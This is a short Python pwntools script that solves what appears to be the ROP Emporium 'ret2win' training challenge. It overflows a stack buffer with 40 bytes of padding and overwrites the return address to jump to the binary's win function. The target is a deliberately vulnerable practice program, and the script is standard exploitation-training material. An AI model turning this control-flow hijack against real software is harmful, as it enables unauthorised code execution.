#!/usr/bin/env python

from pwn import *

p = process("./ret2win")
b = ELF("./ret2win")

ret2win = p64(b.symbols['ret2win'] + 1)
padding = "A" * 40

p.recvuntil("> ")
p.sendline(padding + ret2win)
print p.recvall()
